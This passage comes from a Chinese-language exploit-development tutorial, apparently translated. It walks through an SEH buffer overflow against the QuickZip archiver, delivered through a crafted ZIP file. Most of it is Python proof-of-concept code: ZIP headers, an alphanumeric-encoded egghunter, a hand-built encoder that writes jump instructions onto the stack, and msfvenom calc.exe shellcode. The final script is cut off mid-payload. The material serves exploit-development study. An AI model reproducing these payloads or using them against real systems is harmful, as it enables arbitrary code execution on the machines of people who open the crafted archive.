[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t01f9f43084719ce644.png)

太棒了，我们的有效载荷完全与堆栈可以完美搭配了，下面开始编写我们的编码器。

注意：由于pop esp指令（ x5c）的缘故，ZIP文件的内容看起来会有点不同。  x5c表示一个反斜杠，由QuickZip解释为一个文件夹…这可能在以后有一些影响，但现在没什么。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t01ae6259c90982182c.png)

现在，我们需要做的最后一件事是写一组指令，将egghunter的起始地址放入EAX并跳转到它。

为了避免“坏”字符，我们将在EAX寄存器中设置我们需要的操作码的值，并将其压入我们调整的堆栈上。这样，我们需要的指令将写到我们控制的内存区域中。

下面用一个例子来解释。

让我们从实际想要写的指令开始吧： 



```
push esp;
pop eax;
sub eax, 0xDEADBEEF
jmp eax;
```

很简单——将ESP压入堆栈中，将其弹出到EAX中，通过一定的值将其调整到egghunter中（我们不知道确切的值，因此现在的占位符为0xDEADBEEF），并跳转到EAX的调整地址。

下面生成我们需要的字节： 



```
metasm &gt; push esp
"x54"
metasm &gt; pop eax
"x58"
metasm &gt; sub eax, 0xDEADBEEF
"x2dxefxbexadxde"
metasm &gt; jmp eax
"xffxe0"
```

把它们写成4个一组： 



```
x54x58x2dxef
xbexadxdexff
xe0x90x90x90
```

因为我们一次写4个字节，所以我们需要在末尾填充3个nops（ x90）（把要写入的字节的总长度设为12）。

现在，让我们从右下角开始写字节（因为endianness的缘故）——这将指出我们实际需要压入堆栈的值。 



```
x90x90x90xe0
xffxdexadxbe
xefx2dx58x54
```

记住，我们只能使用ASCII值，这意味着可以使用几乎任何01到7f字节的组合来进行计算。

让我们用一个对利用代码比较友好的指令，将第一组字节写入eax： 



```
# zero out EAX
"x25x10x10x10x10"  # and eax,0x10101010
"x25x01x01x01x01"  # and eax,0x01010101
                           # write 0x909090e0 into EAX
"x05x70x70x70x70"  # add eax, 0x70707070
"x05x70x20x20x20"  # add eax, 0x20202070
"x50"                  # push eax;
```

我们来更新漏洞利用代码并运行它。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t0129090efecb036ab1.png)

太棒了，我们已经在EAX中成功设定了我们需要的值，并把它压入堆栈上，实际上写的是我们需要的指令！

让我们对所有剩余的字节做同样的处理。

完成上述处理后，新的PoC应该如下所示： 



```
#!/usr/bin/python
header_1 = ("x50x4Bx03x04x14x00x00x00x00x00xB7xACxCEx34x00x00x00"
"x00x00x00x00x00x00x00x00xe4x0fx00x00x00")
header_2 = ("x50x4Bx01x02x14x00x14x00x00x00x00x00xB7xACxCEx34x00x00x00"
"x00x00x00x00x00x00x00x00x00xe4x0fx00x00x00x00x00x00x01x00"
"x24x00x00x00x00x00x00x00")
header_3 = ("x50x4Bx05x06x00x00x00x00x01x00x01x00"
"x12x10x00x00x02x10x00x00x00x00")
print "[+] Building PoC.."
max_size = 4064
nseh_offset = 292
jump_offset = 92
# msfencode -e x86/alpha_mixed bufferregister=eax -i egghunter-wow64.bin
# [*] x86/alpha_mixed succeeded with size 146 (iteration=1)
egghunter = ("x50x59x49x49x49x49x49x49x49x49x49x49x49x49"
"x49x49x49x49x37x51x5ax6ax41x58x50x30x41x30"
"x41x6bx41x41x51x32x41x42x32x42x42x30x42x42"
"x41x42x58x50x38x41x42x75x4ax49x66x51x49x4b"
"x52x73x53x63x62x73x36x33x4ex53x6fx30x75x36"
"x6dx51x59x5ax49x6fx36x6fx72x62x71x42x42x4a"
"x66x46x56x38x74x73x78x49x4cx4bx4bx64x61x74"
"x49x6fx47x63x31x4ex50x5ax77x4cx77x75x53x44"
"x49x79x38x38x52x57x36x50x50x30x33x44x6cx4b"
"x59x6ax4ex4fx32x55x38x64x4ex4fx70x75x6bx51"
"x6bx4fx79x77x41x41")
payload = egghunter
payload += "A" * (nseh_offset - len(payload) - jump_offset)   # padding for nSEH
# Offset the stack by 0x62C to start writing to a controlled area of memory
#
payload += "x54"                   # push esp;
payload += "x58"                   # pop eax;
payload += "x05x2dx07x01x01"   # add eax, 0x0101072D
payload += "x2dx01x01x01x01"   # sub eax, 0x01010101
payload += "x50"                   # push eax;
payload += "x5c"                   # pop esp;
# Write instructions for: push esp; pop eax; sub eax, 0xDEADBEEF; jmp eax
#
                                    # Zero-out EAX
payload += "x25x01x01x01x01"   # and eax,0x01010101
payload += "x25x10x10x10x10"   # and eax,0x10101010
                                       # write 0x909090e0 into EAX
payload += "x05x70x70x70x70"   # add eax, 0x70707070
payload += "x05x70x20x20x20"   # add eax, 0x20202070
payload += "x50"                   # push eax;
                                    # Zero-out EAX
payload += "x25x01x01x01x01"   # and eax,0x01010101
payload += "x25x10x10x10x10"   # and eax,0x10101010
                                       # write 0xffdeadbe into EAX
payload += "x05x77x77x77x77"   # add eax, 0x77777777
payload += "x05x37x25x57x77"   # add eax, 0x77572537
payload += "x05x10x11x10x11"   # add eax, 0x11101110
payload += "x50"                   # push eax;
                                    # Zero-out EAX
payload += "x25x01x01x01x01"   # and eax,0x01010101
payload += "x25x10x10x10x10"   # and eax,0x10101010
                                       # write 0xef2d5854 into EAX
payload += "x05x43x47x1cx77"   # add eax, 0x771c4743
payload += "x05x10x10x01x77"   # add eax, 0x77011010
payload += "x05x01x01x10x01"   # add eax, 0x01100101
payload += "x50"                   # push eax;
payload += "A" * (nseh_offset - len(payload))   # padding for the rest of encoder
payload += "x71x9bx70x9b"   # nSEH: jno $-99; jo $-99   =&gt; '9b' will actually be converted to 'a2', which is $-92
payload += "x33x28x42x00"   # SEH
payload += "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr0Cr1Cr2Cr3Cr4Cr5Cr6Cr7Cr8Cr9Cs0Cs1Cs2Cs3Cs4Cs5Cs6Cs7Cs8Cs9Ct0Ct1Ct2Ct3Ct4Ct5Ct6Ct7Ct8Ct9Cu0Cu1Cu2Cu3Cu4Cu5Cu6Cu7Cu8Cu9Cv0Cv1Cv2Cv3Cv4Cv5Cv6Cv7Cv8Cv9Cw0Cw1Cw2Cw3Cw4Cw5Cw6Cw7Cw8Cw9Cx0Cx1Cx2Cx3Cx4Cx5Cx6Cx7Cx8Cx9Cy0Cy1Cy2Cy3Cy4Cy5Cy6Cy7Cy8Cy9Cz0Cz1Cz2Cz3Cz4Cz5Cz6Cz7Cz8Cz9Da0Da1Da2Da3Da4Da5Da6Da7Da8Da9Db0Db1Db2Db3Db4Db5Db6Db7Db8Db9Dc0Dc1Dc2Dc3Dc4Dc5Dc6Dc7Dc8Dc9Dd0Dd1Dd2Dd3Dd4Dd5Dd6Dd7Dd8Dd9De0De1De2De3De4De5De6De7De8De9Df0Df1Df2Df3Df4Df5Df6Df7Df8Df9Dg0Dg1Dg2Dg3Dg4Dg5Dg6Dg7Dg8Dg9Dh0Dh1Dh2Dh3Dh4Dh5Dh6Dh7Dh8Dh9Di0Di1Di2Di3Di4Di5Di6Di7Di8Di9Dj0Dj1Dj2Dj3Dj4Dj5Dj6Dj7Dj8Dj9Dk0Dk1Dk2Dk3Dk4Dk5Dk6Dk7Dk8Dk9Dl0Dl1Dl2Dl3Dl4Dl5Dl6Dl7Dl8Dl9Dm0Dm1Dm2Dm3Dm4Dm5Dm6Dm7Dm8Dm9Dn0Dn1Dn2Dn3Dn4Dn5Dn6Dn7Dn8Dn9Do0Do1Do2Do3Do4Do5Do6Do7Do8Do9Dp0Dp1Dp2Dp3Dp4Dp5Dp6Dp7Dp8Dp9Dq0Dq1Dq2Dq3Dq4Dq5Dq6Dq7Dq8Dq9Dr0Dr1Dr2Dr3Dr4Dr5Dr6Dr7Dr8Dr9Ds0Ds1Ds2Ds3Ds4Ds5Ds6Ds7Ds8Ds9Dt0Dt1Dt2Dt3Dt4Dt5Dt6Dt7Dt8Dt9Du0Du1Du2Du3Du4Du5Du6Du7Du8Du9Dv0Dv1Dv2Dv3Dv4Dv5Dv6Dv7Dv8Dv9Dw0Dw1Dw2Dw3Dw4Dw5Dw6Dw7Dw8Dw9Dx0Dx1Dx2Dx3Dx4Dx5Dx6Dx7Dx8Dx9Dy0Dy1Dy2Dy3Dy4Dy5Dy6Dy7Dy8Dy9Dz0Dz1Dz2Dz3Dz4Dz5Dz6Dz7Dz8Dz9Ea0Ea1Ea2Ea3Ea4Ea5Ea6Ea7Ea8Ea9Eb0Eb1Eb2Eb3Eb4Eb5Eb6Eb7Eb8Eb9Ec0Ec1Ec2Ec3Ec4Ec5Ec6Ec7Ec8Ec9Ed0Ed1Ed2Ed3Ed4Ed5Ed6Ed7Ed8Ed9Ee0Ee1Ee2Ee3Ee4Ee5Ee6Ee7Ee8Ee9Ef0Ef1Ef2Ef3Ef4Ef5Ef6Ef7Ef8Ef9Eg0Eg1Eg2Eg3Eg4Eg5Eg6Eg7Eg8Eg9Eh0Eh1Eh2Eh3Eh4Eh5Eh6Eh7Eh8Eh9Ei0Ei1Ei2Ei3Ei4Ei5Ei6Ei7Ei8Ei9Ej0Ej1Ej2Ej3Ej4Ej5Ej6Ej7Ej8Ej9Ek0Ek1Ek2Ek3Ek4Ek5Ek6Ek7Ek8Ek9El0El1El2El3El4El5El6El7El8El9Em0Em1Em2Em3Em4Em5Em6Em7Em8Em9En0En1En2En3En4En5En6En7En8En9Eo0Eo1Eo2Eo3Eo4Eo5Eo6Eo7Eo8Eo9Ep0Ep1Ep2Ep3Ep4Ep5Ep6Ep7Ep8Ep9Eq0Eq1Eq2Eq3Eq4Eq5Eq6Eq7Eq8Eq9Er0Er1Er2Er3Er4Er5Er6Er7Er8Er9Es0Es1Es2Es3Es4Es5Es6Es7Es8Es9Et0Et1Et2Et3Et4Et5Et6Et7Et8Et9Eu0Eu1Eu2Eu3Eu4Eu5Eu6Eu7Eu8Eu9Ev0Ev1Ev2Ev3Ev"
payload += ".txt"
print "[+] Length = " + str(len(payload))
exploit = header_1 + payload + header_2 + payload + header_3
mefile = open('cst.zip','w');
mefile.write(exploit);
mefile.close()
print "[+] Exploit complete!"
```

执行之后： 

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t01e1a083770a76aecb.png)

太棒了，我们已经成功地利用有效字符编写出了想要的代码！ 现在只需跳回到该区域来执行就好了。 我们还需要将我们写入的临时0xDEADBEEF地址更改为实际的偏移量，前提是我们知道它是什么…但现在为时过早。

<br>

**跳转**

不幸的是，我们没有太多的空间可用于跳转：在我们的编码器代码之后只有5个字节，编码器代码之前是4个字节。所以，我们需要找到相应的指令，让我们跳转到刚写的代码。

事实证明，由于字符限制，实际上我们无法做太多的事情。 任何短的向后跳转指令都包含无效的字符，无法跳转至恰当的地方。所以，应该考虑是否重用之前用过的跳转。

下面来看看我们目前拥有的有效载荷。

[![](https://p0.ssl.qhimg.com/t01e1a083770a76aecb.png)](https://p0.ssl.qhimg.com/t01e1a083770a76aecb.png)

我们需要发挥创造性。让我们重用SEH中的JNO跳转，以便再次回到我们控制的内存区域。我们可以在当前编码器有效载荷的开头部分添加一些NOP，然后通过自定义编码器用其他跳转指令将其覆盖，以将我们跳转到刚编写的代码之前。

哎，这样行得通吗？让我解释一下。

我们需要使用的跳转指令本来可以是简单的JMP $ -16（ xeb  xee），不幸的是它包含了无效的字符，因此不适用于我们…。但是，任何带有有效的字符的跳转指令都会让我们离的太远。

然而！我们可以使用自定义的编码器来处理它们，就像我们将egghunter的地址放置到EAX一样，只需要调整偏移量并修改代码即可。

首先，添加我们的JMP指令。然后，修改我们的原始堆栈，使SEH跳转能够准确到达我们的初始位置。最后，在编码器的开头部分添加一些NOP，它们之后将被所覆盖。下面我们具体介绍其工作原理。 

这里，让我们先从自定义的编码器前面的NOP开始。 由于我们要求使用有效的字符集，因此可以使用 x41  x41（INC ECX）作为NOP。

接下来，进行堆栈调整。 从目前的状态来看，我们需要进一步偏移6个字节，以便写入到要覆盖的区域。为此，我们可以进行相应的调整。

最后，我们需要用编码器写入JNZ $ -16（ x75  xee）指令。 让我们用新的指令来替换最后两个 x90（记住这里使用的是little – endianness，所以我们需要反过来写入）。

最后，代码将变成这样： 



```
#...snip...
nseh_offset = 292
jump_offset = 92
#...snip...
payload = egghunter
payload += "A" * (nseh_offset - len(payload) - jump_offset)    # padding for nSEH
payload += "x41x41"   # INC ECX (acts as NOPs, but using valid character set)
# Offset the stack by 0x632 to start writing to a controlled area of memory
#
payload += "x54"                   # push esp;
payload += "x58"                   # pop eax;
payload += "x05x33x07x01x01"   # add eax, 0x01010733
payload += "x2dx01x01x01x01"   # sub eax, 0x01010101
payload += "x50"                   # push eax;
payload += "x5c"                   # pop esp;
# Write instructions for: push esp; pop eax; sub eax, 0xDEADBEEF; jmp eax; jnz 0xee
#
                                    # Zero-out EAX
payload += "x25x01x01x01x01"   # and eax,0x01010101
payload += "x25x10x10x10x10"   # and eax,0x10101010
                                       # write 0xee7590e0 into EAX  ==&gt;&gt; '0xee75' represents 'JNZ $-16' instruction
payload += "x05x70x70x74x77"   # add eax, 0x77747070
payload += "x05x70x20x01x77"   # add eax, 0x77012070
payload += "x50"                   # push eax;
                                    # Zero-out EAX
payload += "x25x01x01x01x01"   # and eax,0x01010101
payload += "x25x10x10x10x10"   # and eax,0x10101010
                                       # write 0xffdeadbe into EAX
payload += "x05x77x77x77x77"   # add eax, 0x77777777
payload += "x05x37x25x57x77"   # add eax, 0x77572537
payload += "x05x10x11x10x11"   # add eax, 0x11101110
payload += "x50"                   # push eax;
                                    # Zero-out EAX
payload += "x25x01x01x01x01"   # and eax,0x01010101
payload += "x25x10x10x10x10"   # and eax,0x10101010
                                       # write 0xef2d5854 into EAX
payload += "x05x43x47x1cx77"   # add eax, 0x771c4743
payload += "x05x10x10x01x77"   # add eax, 0x77011010
payload += "x05x01x01x10x01"   # add eax, 0x01100101
payload += "x50"                   # push eax;
payload += "A" * (nseh_offset - len(payload))       # padding for the rest of the encoder
payload += "x71x9bx70x9b"       # nSEH: jno $-99; jo $-99   =&gt; '9b' will actually be converted to 'a2', which is $-92
payload += "x33x28x42x00"       # SEH
#...snip...
```

一旦执行，会发生以下情况：

**崩溃被触发**

**POP-POP-RET指令被调用**

**获得JNO $ -92的跳转地址**

**从头开始执行自定义编码器**

**代码最终将到达第3步中跳转的JNO指令**

**再次取得JNO的跳转地址，但这次，我们登陆的第一条指令是刚刚写入的16个字节的跳转指令**

**获取跳转指令的跳转地址**

**使用自定义编码器写入要执行的指令 **

我们来看看到底发生了什么。

执行自定义的编码器后：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t0147f175935f11d34f.png)

取得JMP的跳转地址

[![](https://p4.ssl.qhimg.com/t01d7d8180d340906e0.png)](https://p4.ssl.qhimg.com/t01d7d8180d340906e0.png)

在写入指令之前登陆，准备执行

[![](https://p0.ssl.qhimg.com/t010e13d6d97675c8ca.png)](https://p0.ssl.qhimg.com/t010e13d6d97675c8ca.png)

真棒，正是我们期待的！ 现在我们只需要弄清楚用什么值替代0xDEADBEEF就可以了！

让我们来计算一下——ESP的当前值是0x0018FB4E，而egghunter代码从0x0018FA90开始，这意味着我们需要将EAX减去0xBE，让EAX指向我们的目的地。

我们开始修改漏洞利用代码，这里不是从EAX中减去0xDEADBEEF，而是减去0xBE。 PoC应进行以下修改： 



```
# Zero-out EAX
payload += "x25x01x01x01x01"   # and eax,0x01010101
payload += "x25x10x10x10x10"   # and eax,0x10101010
                                       # write 0xff000000 into EAX
payload += "x05x01x01x01x77"   # add eax, 0x77010101
payload += "x05x01x01x01x77"   # add eax, 0x77010101
payload += "x05x10x10x10x22"   # add eax, 0x22101010
payload += "x2dx12x12x12x11"   # sub eax, 0x11121212
payload += "x50"                   # push eax;
                                    # Zero-out EAX
payload += "x25x01x01x01x01"   # and eax,0x01010101
payload += "x25x10x10x10x10"   # and eax,0x10101010
                                       # write 0xbe2d5854 into EAX
payload += "x05x43x47x1cx67"   # add eax, 0x671c4743
payload += "x05x11x11x11x57"   # add eax, 0x57111111
payload += "x50"                   # push eax;
```

让我们来看看它会把我们带到哪里去。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t019d6ed0a284de4c61.png)

真棒！我们跳转到了eghunter。现在，可以轻松插入选择的shellcode，并让egghunter找到它了。

我们来运行！mona findmsp，以防止我们的有效载荷仍然在内存中…

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t016798390746ec1b50.png)

什么？！它消失了！去哪儿了？发生了什么？那些工作都白做了吗???

Ok，我知道咋回事。我们在自定义编码例程的开头部分添加的指令损坏了有效载荷，并导致我们的shellcode消失。出问题的指令是POP ESP（ x5c）——从前的同一个字节会让我们的文件名被解释为一个目录！

我花了很多时间思考、调试，并试图找出一个不会损坏有效载荷的替代方案，但没有成功。在使用有效字符集的情况下，事情根本没那么简单。

但是，还是有一个解决方案！也许不是很理想，但毕竟有办法了。看看我们的漏洞利用代码中的下面一行： 

```
exploit = header_1 + payload + header_2 + payload + header_3
```

如果在header_3之后再次添加有效载荷，如何？ 这基本上就是在ZIP文件的末尾附加一些垃圾，但它仍然可以工作。 

将该行做如下修改，并用QuickZip打开它。 

```
exploit = header_1 + payload + header_2 + payload + header_3 + payload
```

[![](https://p2.ssl.qhimg.com/t0182ece007023f1f7f.png)](https://p2.ssl.qhimg.com/t0182ece007023f1f7f.png)

有一个警告指出在文件末尾有一些垃圾，但没关系，因为仍然可以成功打开该文件。

让我们触发崩溃，看看这一次我们是否可以在内存中找到这个模版。

[![](https://p4.ssl.qhimg.com/t015c1094209ed055db.png)](https://p4.ssl.qhimg.com/t015c1094209ed055db.png)

我的天哪，它就在那里！！！ 

<br>

**Shellcode**

现在，我们只需安装常规流程来处理一下shellcode就行了——我们需要找出坏字符，然后在shellcode之前插入一个“egg”（w00tw00t）并对齐堆栈。

我不会详细介绍寻找坏字符的细枝末节，因为我已经在这里详细介绍过了。 幸运的是，对于我们来说，这部分有效负载中仅有的坏字符是 x00， x0a和 x0d。

我们还需要在shellcode的开头插入w00tw00t字符，以确保egghunter可以定位它，并将执行权重定向到“egg”之后的第一个指令。

最后，我们需要对齐堆栈，以确保ESP指向一个16字节倍数的地址。 这样做的原因是有一些“SIMD”（单指令，多数据）指令可以并行处理内存中的多个字，所以要求这些字的起始地址是16字节的倍数。 

如果我们没有正确对齐堆栈，那么shellcode根本不起作用。 我们可以轻松地利用单个指令AND esp，0xFFFFFFF0来对齐堆栈，也就是让它正好在w00tw00t“蛋”之后，在实际shellcode之前。

对于这个概念验证来说，我们将使用msfvenom生成一个简单的、弹出计算器的shellcode，具体如下所示： 



```
shellcode = "w00tw00t"                     # egg
shellcode += "x81xe4xf0xffxffxff"    # align the stack: AND esp,0xFFFFFFF0
# msfvenom -p windows/exec CMD=calc.exe -b 'x00x0ax0d'
# [*] x86/shikata_ga_nai succeeded with size 227 (iteration=1)
shellcode += ("xbfxdcxaex26x3dxdaxddxd9x74x24xf4x5bx31xc9"
"xb1x33x31x7bx12x03x7bx12x83x37x52xc4xc8x3b"
"x43x80x33xc3x94xf3xbax26xa5x21xd8x23x94xf5"
"xaax61x15x7dxfex91xaexf3xd7x96x07xb9x01x99"
"x98x0fx8ex75x5ax11x72x87x8fxf1x4bx48xc2xf0"
"x8cxb4x2dxa0x45xb3x9cx55xe1x81x1cx57x25x8e"
"x1dx2fx40x50xe9x85x4bx80x42x91x04x38xe8xfd"
"xb4x39x3dx1ex88x70x4axd5x7ax83x9ax27x82xb2"
"xe2xe4xbdx7bxefxf5xfaxbbx10x80xf0xb8xadx93"
"xc2xc3x69x11xd7x63xf9x81x33x92x2ex57xb7x98"
"x9bx13x9fxbcx1axf7xabxb8x97xf6x7bx49xe3xdc"
"x5fx12xb7x7dxf9xfex16x81x19xa6xc7x27x51x44"
"x13x51x38x02xe2xd3x46x6bxe4xebx48xdbx8dxda"
"xc3xb4xcaxe2x01xf1x25xa9x08x53xaex74xd9xe6"
"xb3x86x37x24xcax04xb2xd4x29x14xb7xd1x76x92"
"x2bxabxe7x77x4cx18x07x52x2fxffx9bx3ex9ex9a"
"x1bxa4xde")
```

而涵盖迄今所讨论的所有内容的PoC代码如下所示： 



```
#!/usr/bin/python
header_1 = ("x50x4Bx03x04x14x00x00x00x00x00xB7xACxCEx34x00x00x00"
"x00x00x00x00x00x00x00x00xe4x0fx00x00x00")
header_2 = ("x50x4Bx01x02x14x00x14x00x00x00x00x00xB7xACxCEx34x00x00x00"
"x00x00x00x00x00x00x00x00x00xe4x0fx00x00x00x00x00x00x01x00"
"x24x00x00x00x00x00x00x00")
header_3 = ("x50x4Bx05x06x00x00x00x00x01x00x01x00"
"x12x10x00x00x02x10x00x00x00x00")
print "[+] Building PoC.."
max_size = 4064
nseh_offset = 292
jump_offset = 92
# msfencode -e x86/alpha_mixed bufferregister=eax -i egghunter-wow64.bin
# [*] x86/alpha_mixed succeeded with size 146 (iteration=1)
egghunter = ("x50x59x49x49x49x49x49x49x49x49x49x49x49x49"
"x49x49x49x49x37x51x5ax6ax41x58x50x30x41x30"
"x41x6bx41x41x51x32x41x42x32x42x42x30x42x42"
"x41x42x58x50x38x41x42x75x4ax49x66x51x49x4b"
"x52x73x53x63x62x73x36x33x4ex53x6fx30x75x36"
"x6dx51x59x5ax49x6fx36x6fx72x62x71x42x42x4a"
"x66x46x56x38x74x73x78x49x4cx4bx4bx64x61x74"
"x49x6fx47x63x31x4ex50x5ax77x4cx77x75x53x44"
"x49x79x38x38x52x57x36x50x50x30x33x44x6cx4b"
"x59x6ax4ex4fx32x55x38x64x4ex4fx70x75x6bx51"
"x6bx4fx79x77x41x41")
payload = egghunter
payload += "A" * (nseh_offset - len(payload) - jump_offset) # padding for nSEH
payload += "x41x41"   # INC ECX (acts as NOPs, but with valid character set)
# Offset the stack by 0x632 to start writing to a controlled area of memory
#
payload += "x54"                   # push esp;
payload += "x58"                   # pop eax;
payload += "x05x33x07x01x01"   # add eax, 0x01010733
payload += "x2dx01x01x01x01"   # sub eax, 0x01010101
payload += "x50"                   # push eax;
payload += "x5c"                   # pop esp;
# Write instructions for: push esp; pop eax; sub eax, 0xBE; jmp eax; jmp 0xee
#
                                    # Zero-out EAX
payload += "x25x01x01x01x01"   # and eax,0x01010101
payload += "x25x10x10x10x10"   # and eax,0x10101010
                                       # write 0xeceb90e0 into EAX
payload += "x05x70x70x77x77"   # add eax, 0x77777070
payload += "x05x70x20x74x77"   # add eax, 0x77742070
payload += "x50"                   # push eax;
                                    # Zero-out EAX
payload += "x25x01x01x01x01"   # and eax,0x01010101
payload += "x25x10x10x10x10"   # and eax,0x10101010
                                       # write 0xff000000 into EAX
payload += "x05x01x01x01x77"   # add eax, 0x77010101
payload += "x05x01x01x01x77"   # add eax, 0x77010101
